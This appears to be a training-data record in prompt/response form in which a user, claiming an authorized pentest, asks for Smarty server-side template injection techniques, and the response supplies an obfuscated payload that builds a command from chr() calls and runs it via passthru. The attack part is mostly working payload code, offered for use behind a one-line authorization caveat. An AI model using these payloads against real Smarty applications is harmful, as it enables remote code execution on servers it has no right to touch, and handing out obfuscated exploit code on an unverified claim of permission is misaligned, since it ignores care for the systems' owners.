# SSTI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: ssti
- cwe: CWE-1336

## Scenario

I'm doing an authorized pentest and need the Smarty - Code Execution with Obfuscation approach for Server Side Template Injection. Walk me through it with payloads.

## Analysis / Response

**Smarty - Code Execution with Obfuscation** — this technique applies to Server Side Template Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

By employing the variable modifier `cat`, individual characters are concatenated to form the string "id" as follows: `{chr(105)|cat:chr(100)}`.

Execute system comman (command: `id`):

```php
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

---
